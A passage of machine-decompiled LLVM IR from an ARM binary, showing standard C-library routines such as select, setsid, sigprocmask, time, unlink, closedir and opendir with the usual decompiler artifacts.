  %v4_122c8 = inttoptr i32 %v3_122c8 to i32*
  store i32 %v1_122c4, i32* %v4_122c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_122d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_122d0

dec_label_pc_122d0:                               ; preds = %entry, %dec_label_pc_122b8
  %v1_122d4 = phi i32 [ %v0_122a8, %entry ], [ -1, %dec_label_pc_122b8 ]
  %v2_122d0 = phi i32 [ %v3_1229c, %entry ], [ %v2_122d0.pre, %dec_label_pc_122b8 ]
  store i32 %v2_122d0, i32* @r7, align 4
  ret i32 %v1_122d4

; uselistorder directives
  uselistorder i32 %v0_122a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122d0, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_122dc = load i32, i32* @r4, align 4
  store i32 %v3_122dc, i32* %stack_var_-12, align 4
  %v0_122ec = load i32, i32* @r0, align 4
  store i32 %v0_122ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122ec, -4095
  br i1 %tmp, label %dec_label_pc_12314, label %dec_label_pc_122fc

dec_label_pc_122fc:                               ; preds = %entry
  %v0_12300 = call i32 @__aeabi_read_tp()
  %v3_12304 = load i16, i16* @global_var_23068.362, align 2
  %v4_12304 = sext i16 %v3_12304 to i32
  %v0_12308 = load i32, i32* %r2.global-to-local, align 4
  %v1_12308 = sub i32 0, %v0_12308
  store i32 %v1_12308, i32* %r2.global-to-local, align 4
  %v3_1230c = add i32 %v4_12304, %v0_12300
  %v4_1230c = inttoptr i32 %v3_1230c to i32*
  store i32 %v1_12308, i32* %v4_1230c, align 4
  %v2_12314.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %entry, %dec_label_pc_122fc
  %v1_12318 = phi i32 [ %v0_122ec, %entry ], [ -1, %dec_label_pc_122fc ]
  %v2_12314 = phi i32 [ %v3_122dc, %entry ], [ %v2_12314.pre, %dec_label_pc_122fc ]
  store i32 %v2_12314, i32* @r4, align 4
  ret i32 %v1_12318

; uselistorder directives
  uselistorder i32 %v0_122ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12314, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12320 = load i32, i32* @r4, align 4
  store i32 %v3_12320, i32* %stack_var_-28, align 4
  %v6_12320 = load i32, i32* @r5, align 4
  %v9_12320 = load i32, i32* @r6, align 4
  %v12_12320 = load i32, i32* @r7, align 4
  %v15_12320 = load i32, i32* @r8, align 4
  %v18_12320 = load i32, i32* @sl, align 4
  %v21_12320 = load i32, i32* @lr, align 4
  %v4_12330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_12338 = icmp eq i32 %v4_12330, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12338, label %dec_label_pc_12354, label %entry.dec_label_pc_12360_crit_edge

entry.dec_label_pc_12360_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12360

dec_label_pc_12354:                               ; preds = %entry
  store i32 %v3_12320, i32* @r4, align 4
  store i32 %v9_12320, i32* @r6, align 4
  store i32 %v12_12320, i32* @r7, align 4
  store i32 %v15_12320, i32* @r8, align 4
  store i32 %v18_12320, i32* %sl.global-to-local, align 4
  %v0_1235c = call i32 @__syscall_select()
  br label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %entry.dec_label_pc_12360_crit_edge, %dec_label_pc_12354
  %v0_12360 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12360, i32* @r5, align 4
  %v0_12374 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_12374, i32* @r0, align 4
  %v0_1237c = call i32 @__syscall_select()
  store i32 %v0_1237c, i32* @r4, align 4
  %v0_12384 = load i32, i32* @r5, align 4
  %v1_12388 = call i32 @__libc_disable_asynccancel(i32 %v0_12384)
  %v0_1238c = load i32, i32* @r4, align 4
  %v2_12394 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12394, i32* @r4, align 4
  store i32 %v6_12320, i32* @r5, align 4
  store i32 %v9_12320, i32* @r6, align 4
  store i32 %v12_12320, i32* @r7, align 4
  store i32 %v15_12320, i32* @r8, align 4
  store i32 %v18_12320, i32* @sl, align 4
  store i32 %v21_12320, i32* @lr, align 4
  ret i32 %v0_1238c

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12360, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123a4 = load i32, i32* @r7, align 4
  store i32 %v3_123a4, i32* %stack_var_-8, align 4
  %v0_123b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_123b0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_123b0, -4095
  br i1 %tmp, label %dec_label_pc_123d8, label %dec_label_pc_123c0

dec_label_pc_123c0:                               ; preds = %entry
  %v0_123c4 = call i32 @__aeabi_read_tp()
  %v3_123c8 = load i16, i16* @global_var_23068.362, align 2
  %v4_123c8 = sext i16 %v3_123c8 to i32
  %v0_123cc = load i32, i32* %r2.global-to-local, align 4
  %v1_123cc = sub i32 0, %v0_123cc
  store i32 %v1_123cc, i32* %r2.global-to-local, align 4
  %v3_123d0 = add i32 %v4_123c8, %v0_123c4
  %v4_123d0 = inttoptr i32 %v3_123d0 to i32*
  store i32 %v1_123cc, i32* %v4_123d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_123d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %entry, %dec_label_pc_123c0
  %v1_123dc = phi i32 [ %v0_123b0, %entry ], [ -1, %dec_label_pc_123c0 ]
  %v2_123d8 = phi i32 [ %v3_123a4, %entry ], [ %v2_123d8.pre, %dec_label_pc_123c0 ]
  store i32 %v2_123d8, i32* @r7, align 4
  ret i32 %v1_123dc

; uselistorder directives
  uselistorder i32 %v0_123b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123d8, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_123e8 = icmp eq i32* %arg2, null
  br i1 %v2_123e8, label %dec_label_pc_1242c, label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %entry
  %v2_123fc = load i32, i32* %arg2, align 4
  %v1_12400 = icmp slt i32 %v2_123fc, 0
  br i1 %v1_12400, label %dec_label_pc_12414, label %dec_label_pc_12408

dec_label_pc_12408:                               ; preds = %dec_label_pc_123fc
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_12408 = load i32, i32* %.pre3, align 4
  %v1_1240c = urem i32 %v3_12408, 2
  %v2_1240c = icmp eq i32 %v1_1240c, 0
  br i1 %v2_1240c, label %dec_label_pc_1242c, label %dec_label_pc_12414

dec_label_pc_12414:                               ; preds = %dec_label_pc_123fc, %dec_label_pc_12408
  %v2_12414 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_12414 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_1242c

dec_label_pc_1242c:                               ; preds = %dec_label_pc_12408, %entry, %dec_label_pc_12414
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_12460, label %dec_label_pc_12448

dec_label_pc_12448:                               ; preds = %dec_label_pc_1242c
  %v1_1244c = sub i32 0, %arg1
  %v3_12450 = load i16, i16* @global_var_23068.362, align 2
  %v4_12450 = sext i16 %v3_12450 to i32
  %v0_12454 = call i32 @__aeabi_read_tp()
  %v3_12458 = add i32 %v4_12450, %v0_12454
  %v4_12458 = inttoptr i32 %v3_12458 to i32*
  store i32 %v1_1244c, i32* %v4_12458, align 4
  br label %dec_label_pc_12460

dec_label_pc_12460:                               ; preds = %dec_label_pc_1242c, %dec_label_pc_12448
  %v1_12468 = phi i32 [ %arg1, %dec_label_pc_1242c ], [ -1, %dec_label_pc_12448 ]
  ret i32 %v1_12468

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12460, { 1, 0 }
  uselistorder label %dec_label_pc_1242c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12414, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_12474 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_12484 = call i32 @gettimeofday(i32 %v2_12474, i32 0)
  %v2_12488 = load i32, i32* %stack_var_-16, align 4
  %v2_1248c = icmp eq i32* %arg1, null
  br i1 %v2_1248c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_12488, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_12488

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124a0 = load i32, i32* @r7, align 4
  store i32 %v3_124a0, i32* %stack_var_-8, align 4
  %v0_124ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_124ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_124ac, -4095
  br i1 %tmp, label %dec_label_pc_124d4, label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %entry
  %v0_124c0 = call i32 @__aeabi_read_tp()
  %v3_124c4 = load i16, i16* @global_var_23068.362, align 2
  %v4_124c4 = sext i16 %v3_124c4 to i32
  %v0_124c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_124c8 = sub i32 0, %v0_124c8
  store i32 %v1_124c8, i32* %r2.global-to-local, align 4
  %v3_124cc = add i32 %v4_124c4, %v0_124c0
  %v4_124cc = inttoptr i32 %v3_124cc to i32*
  store i32 %v1_124c8, i32* %v4_124cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_124d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_124d4

dec_label_pc_124d4:                               ; preds = %entry, %dec_label_pc_124bc
  %v1_124d8 = phi i32 [ %v0_124ac, %entry ], [ -1, %dec_label_pc_124bc ]
  %v2_124d4 = phi i32 [ %v3_124a0, %entry ], [ %v2_124d4.pre, %dec_label_pc_124bc ]
  store i32 %v2_124d4, i32* @r7, align 4
  ret i32 %v1_124d8

; uselistorder directives
  uselistorder i32 %v0_124ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124d4, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_124e0 = load i32, i32* @r4, align 4
  store i32 %v3_124e0, i32* %stack_var_-24, align 4
  %v9_124e0 = load i32, i32* @r6, align 4
  %v12_124e0 = load i32, i32* @r7, align 4
  %v15_124e0 = load i32, i32* @r8, align 4
  %v18_124e0 = load i32, i32* @lr, align 4
  %v2_124e4 = load i32, i32* %arg1, align 4
  store i32 %v2_124e4, i32* %r3.global-to-local, align 4
  %v3_124ec = icmp eq i32 %v2_124e4, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r6, align 4
  br i1 %v3_124ec, label %dec_label_pc_12500, label %dec_label_pc_1251c

dec_label_pc_12500:                               ; preds = %entry
  store i32 68440, i32* %r2.global-to-local, align 4
  %v0_12504 = call i32 @__aeabi_read_tp()
  %v3_12508 = load i16, i16* @global_var_23068.362, align 2
  %v4_12508 = sext i16 %v3_12508 to i32
  store i32 %v4_12508, i32* %r2.global-to-local, align 4
  %v0_1250c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1250c, i32* %r1.global-to-local, align 4
  %v1_12510 = add i32 %v0_1250c, 10
  store i32 %v1_12510, i32* %r3.global-to-local, align 4
  %v3_12514 = add i32 %v4_12508, %v0_12504
  %v4_12514 = inttoptr i32 %v3_12514 to i32*
  store i32 %v1_12510, i32* %v4_12514, align 4
  %v0_125c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_125c4

dec_label_pc_1251c:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_12520 = add i32 %tmp, 24
  store i32 %v1_12520, i32* %r2.global-to-local, align 4
  %v4_12528 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 68) to i32*), align 4
  store i32 %v4_12528, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12534 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12534)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1254c = load i32, i32* @r6, align 4
  %v2_1254c = add i32 %v0_1254c, 16
  %v3_1254c = inttoptr i32 %v2_1254c to i32*
  %v4_1254c = load i32, i32* %v3_1254c, align 4
  call void @__pseudo_branch(i32 %v4_1254c)
  %v0_12558 = load i32, i32* @r7, align 4
  %v1_12558 = inttoptr i32 %v0_12558 to i32*
  %v2_12558 = load i32, i32* %v1_12558, align 4
  store i32 %v2_12558, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12568 = load i32, i32* @r8, align 4
  store i32 %v0_12568, i32* %v1_12558, align 4
  %v0_1256c = load i32, i32* @r6, align 4
  %v1_1256c = load i32, i32* %r3.global-to-local, align 4
  %v2_1256c = add i32 %v1_1256c, %v0_1256c
  %v3_1256c = inttoptr i32 %v2_1256c to i32*
  %v4_1256c = load i32, i32* %v3_1256c, align 4
  store i32 ptrtoint (i32* @global_var_12578.391 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1256c)
  %v0_12578 = load i32, i32* @r7, align 4
  %v1_12578 = add i32 %v0_12578, 12
  %v2_12578 = inttoptr i32 %v1_12578 to i32*
  %v3_12578 = load i32, i32* %v2_12578, align 4
  store i32 %v3_12578, i32* @r0, align 4
  %v0_1257c = call i32 @free()
  %v0_12580 = load i32, i32* @r7, align 4
  store i32 %v0_12580, i32* @r0, align 4
  %v0_12584 = call i32 @free()
  %v0_1258c = load i32, i32* @r4, align 4
  store i32 %v0_1258c, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_1258c, -4095
  br i1 %tmp11, label %dec_label_pc_125c0, label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_1251c
  store i32 68272, i32* %r3.global-to-local, align 4
  %v0_125ac = call i32 @__aeabi_read_tp()
  %v3_125b0 = load i16, i16* @global_var_23068.362, align 2
  %v4_125b0 = sext i16 %v3_125b0 to i32
  store i32 %v4_125b0, i32* %r3.global-to-local, align 4
  %v0_125b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_125b4 = sub i32 0, %v0_125b4
  store i32 %v1_125b4, i32* %r2.global-to-local, align 4
  %v3_125b8 = add i32 %v4_125b0, %v0_125ac
  %v4_125b8 = inttoptr i32 %v3_125b8 to i32*
  store i32 %v1_125b4, i32* %v4_125b8, align 4
  %v0_125bc = load i32, i32* @r8, align 4
  br label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_1251c, %dec_label_pc_125a8
  %v0_125c0 = phi i32 [ %v0_1258c, %dec_label_pc_1251c ], [ %v0_125bc, %dec_label_pc_125a8 ]
  store i32 %v0_125c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_125c4

dec_label_pc_125c4:                               ; preds = %dec_label_pc_12500, %dec_label_pc_125c0
  %v0_125c4 = phi i32 [ %v0_125c4.pre, %dec_label_pc_12500 ], [ %v0_125c0, %dec_label_pc_125c0 ]
  %v2_125cc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_125cc, i32* @r4, align 4
  store i32 %v9_124e0, i32* @r6, align 4
  store i32 %v12_124e0, i32* @r7, align 4
  store i32 %v15_124e0, i32* @r8, align 4
  store i32 %v18_124e0, i32* @lr, align 4
  ret i32 %v0_125c4

; uselistorder directives
  uselistorder i32 %v0_1258c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_125c4, { 1, 0 }
  uselistorder label %dec_label_pc_125c0, { 1, 0 }
}

define i32 @function_125dc(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_125dc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_125dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_125dc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_125dc
  %tmp5 = inttoptr i32 %arg2 to i16*
  store i32 0, i32* %r0.global-to-local, align 4
  store i16 0, i16* %tmp5, align 2
  %v6_125ec = load i32, i32* %r0.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_125dc, %bb
  %v10_125ec = phi i32 [ %tmp, %dec_label_pc_125dc ], [ %v6_125ec, %bb ]
  ret i32 %v10_125ec

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_125f0 = load i32, i32* @r4, align 4
  %v6_125f0 = load i32, i32* @r5, align 4
  %v9_125f0 = load i32, i32* @r6, align 4
  %v12_125f0 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_12604 = call i32 @malloc()
  %v2_1260c = icmp eq i32 %v0_12604, 0
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r6, align 4
  br i1 %v2_1260c, label %bb, label %dec_label_pc_1261c

bb:                                               ; preds = %entry
  br label %dec_label_pc_126a8

dec_label_pc_1261c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12620 = load i32, i32* @r4, align 4
  %v2_12620 = icmp ugt i32 %v0_12620, 511
  %v2_12624 = add i32 %v0_12604, 4
  %v3_12624 = inttoptr i32 %v2_12624 to i32*
  store i32 0, i32* %v3_12624, align 4
  %v0_12628 = load i32, i32* %r3.global-to-local, align 4
  %v2_12628 = add i32 %v0_12604, 16
  %v3_12628 = inttoptr i32 %v2_12628 to i32*
  store i32 %v0_12628, i32* %v3_12628, align 4
  %v0_1262c = load i32, i32* %r3.global-to-local, align 4
  %v2_1262c = add i32 %v0_12604, 8
  %v3_1262c = inttoptr i32 %v2_1262c to i32*
  store i32 %v0_1262c, i32* %v3_1262c, align 4
  br i1 %v2_12620, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1261c
  %v0_126342 = load i32, i32* @r4, align 4
  %v2_126343 = add i32 %v0_12604, 20
  %v3_126344 = inttoptr i32 %v2_126343 to i32*
  store i32 %v0_126342, i32* %v3_126344, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1261c
  %v1_12630 = load i32, i32* %r3.global-to-local, align 4
  %v2_12630 = add i32 %v1_12630, 512
  store i32 %v2_12630, i32* %r3.global-to-local, align 4
  %v0_12634 = load i32, i32* @r4, align 4
  %v2_12634 = add i32 %v0_12604, 20
  %v3_12634 = inttoptr i32 %v2_12634 to i32*
  store i32 %v0_12634, i32* %v3_12634, align 4
  %v1_12638 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_12638, i32* %v3_12634, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_12604, i32* @r5, align 4
  %v0_12640 = load i32, i32* @r7, align 4
  %v2_12640 = inttoptr i32 %v0_12604 to i32*
  store i32 %v0_12640, i32* %v2_12640, align 4
  %v0_12644 = load i32, i32* @r5, align 4
  %v1_12644 = add i32 %v0_12644, 20
  %v2_12644 = inttoptr i32 %v1_12644 to i32*
  %v3_12644 = load i32, i32* %v2_12644, align 4
  store i32 %v3_12644, i32* %r1.global-to-local, align 4
  %v2_1264c = call i32 @calloc(i32 1, i32 %v3_12644)
  %v2_12650 = icmp eq i32 %v2_1264c, 0
  store i32 %v2_1264c, i32* @r4, align 4
  %v1_12658 = load i32, i32* @r5, align 4
  %v2_12658 = add i32 %v1_12658, 12
  %v3_12658 = inttoptr i32 %v2_12658 to i32*
  store i32 %v2_1264c, i32* %v3_12658, align 4
  br i1 %v2_12650, label %dec_label_pc_12660, label %dec_label_pc_12670

dec_label_pc_12660:                               ; preds = %bb17
  %v0_12660 = load i32, i32* @r5, align 4
  store i32 %v0_12660, i32* @r0, align 4
  %v0_12664 = call i32 @free()
  %v0_12668 = load i32, i32* @r4, align 4
  br label %dec_label_pc_126a8

dec_label_pc_12670:                               ; preds = %bb17
  %v0_12674 = load i32, i32* @r6, align 4
  %v2_12674 = add i32 %v0_12674, -34312
  store i32 %v2_12674, i32* %r3.global-to-local, align 4
  %v1_1267c = inttoptr i32 %v2_12674 to i32*
  %v2_1267c = load i32, i32* %v1_1267c, align 4
  %v3_1267c = add i32 %v0_12674, -34308
  %v4_1267c = inttoptr i32 %v3_1267c to i32*
  %v5_1267c = load i32, i32* %v4_1267c, align 4
  store i32 %v5_1267c, i32* %r1.global-to-local, align 4
  %v6_1267c = add i32 %v0_12674, -34304
  %v7_1267c = inttoptr i32 %v6_1267c to i32*
  %v8_1267c = load i32, i32* %v7_1267c, align 4
  store i32 %v8_1267c, i32* %r2.global-to-local, align 4
  %v9_1267c = add i32 %v0_12674, -34300
  %v10_1267c = inttoptr i32 %v9_1267c to i32*
  %v11_1267c = load i32, i32* %v10_1267c, align 4
  store i32 %v11_1267c, i32* %r3.global-to-local, align 4
  %v12_1267c = add i32 %v0_12674, -34296
  %v1_12688 = inttoptr i32 %v12_1267c to i32*
  %v2_12688 = load i32, i32* %v1_12688, align 4
  %v3_12688 = add i32 %v0_12674, -34292
  %v4_12688 = inttoptr i32 %v3_12688 to i32*
  %v5_12688 = load i32, i32* %v4_12688, align 4
  store i32 %v2_12688, i32* %stack_var_-32, align 4
  store i32 %v5_1267c, i32* %r1.global-to-local, align 4
  store i32 %v8_1267c, i32* %r2.global-to-local, align 4
  store i32 %v11_1267c, i32* %r3.global-to-local, align 4
  %v0_12698 = load i32, i32* @r5, align 4
  %v1_12698 = add i32 %v0_12698, 24
  %v1_1269c = inttoptr i32 %v1_12698 to i32*
  store i32 %v2_1267c, i32* %v1_1269c, align 4
  %v3_1269c = add i32 %v0_12698, 28
  %v4_1269c = inttoptr i32 %v3_1269c to i32*
  %v5_1269c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1269c, i32* %v4_1269c, align 4
  %v6_1269c = add i32 %v0_12698, 32
  %v7_1269c = inttoptr i32 %v6_1269c to i32*
  %v8_1269c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1269c, i32* %v7_1269c, align 4
  %v9_1269c = add i32 %v0_12698, 36
  %v10_1269c = inttoptr i32 %v9_1269c to i32*
  %v11_1269c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1269c, i32* %v10_1269c, align 4
  %v12_1269c = add i32 %v0_12698, 40
  %v2_126a0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_12688, i32* %r1.global-to-local, align 4
  %v1_126a4 = inttoptr i32 %v12_1269c to i32*
  store i32 %v2_126a0, i32* %v1_126a4, align 4
  %v3_126a4 = add i32 %v0_12698, 44
  %v4_126a4 = inttoptr i32 %v3_126a4 to i32*
  %v5_126a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_126a4, i32* %v4_126a4, align 4
  %v0_126a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_126a8

dec_label_pc_126a8:                               ; preds = %bb, %dec_label_pc_12660, %dec_label_pc_12670
  %v0_126a8 = phi i32 [ 0, %bb ], [ %v0_12668, %dec_label_pc_12660 ], [ %v0_126a8.pre, %dec_label_pc_12670 ]
  store i32 %v3_125f0, i32* @r4, align 4
  store i32 %v6_125f0, i32* @r5, align 4
  store i32 %v9_125f0, i32* @r6, align 4
  store i32 %v12_125f0, i32* @r7, align 4
  ret i32 %v0_126a8

; uselistorder directives
  uselistorder i32 %v2_1264c, { 1, 0, 2 }
  uselistorder i32 %v0_12604, { 4, 3, 6, 0, 2, 1, 5, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_126a8, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_126c0 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_126c8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_126f8, label %dec_label_pc_126e0

dec_label_pc_126e0:                               ; preds = %entry
  %v0_126e4 = call i32 @__aeabi_read_tp()
  %v3_126e8 = load i16, i16* @global_var_23068.362, align 2
  %v4_126e8 = sext i16 %v3_126e8 to i32
  %v0_126ec = load i32, i32* %r2.global-to-local, align 4
  %v1_126ec = sub i32 0, %v0_126ec
  store i32 %v1_126ec, i32* %r2.global-to-local, align 4
  %v3_126f0 = add i32 %v4_126e8, %v0_126e4
  %v4_126f0 = inttoptr i32 %v3_126f0 to i32*
  store i32 %v1_126ec, i32* %v4_126f0, align 4
  br label %dec_label_pc_1271c

dec_label_pc_126f8:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_126f8 = icmp slt i32 %arg1, 0
  br i1 %v1_126f8, label %dec_label_pc_1271c, label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126f8
  store i32 %v2_126c8, i32* @r1, align 4
  %v0_12704 = call i32 @fstat()
  %v1_12708 = icmp slt i32 %v0_12704, 0
  br i1 %v1_12708, label %dec_label_pc_12710, label %dec_label_pc_12724

dec_label_pc_12710:                               ; preds = %dec_label_pc_12700
  br label %dec_label_pc_1271c

dec_label_pc_1271c:                               ; preds = %dec_label_pc_12710, %dec_label_pc_126f8, %dec_label_pc_126e0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12768

dec_label_pc_12724:                               ; preds = %dec_label_pc_12700
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1272c = load i32, i32* @r7, align 4
  %v3_12730 = call i32 @__GI___fcntl_nocancel(i32 %v0_1272c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_12738 = load i32, i32* @r7, align 4
  %v2_1273c = call i32 @fd_to_DIR(i32 %v0_12738, i32 %tmp)
  store i32 %v2_1273c, i32* %r1.global-to-local, align 4
  %v2_12740 = icmp eq i32 %v2_1273c, 0
  br i1 %v2_12740, label %dec_label_pc_12748, label %dec_label_pc_12768

dec_label_pc_12748:                               ; preds = %dec_label_pc_12724
  %v0_12758 = call i32 @__aeabi_read_tp()
  %v3_1275c = load i16, i16* @global_var_23068.362, align 2
  %v4_1275c = sext i16 %v3_1275c to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12764 = add i32 %v4_1275c, %v0_12758
  %v4_12764 = inttoptr i32 %v3_12764 to i32*
  store i32 12, i32* %v4_12764, align 4
  %v0_12768.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12768

dec_label_pc_12768:                               ; preds = %dec_label_pc_12724, %dec_label_pc_1271c, %dec_label_pc_12748
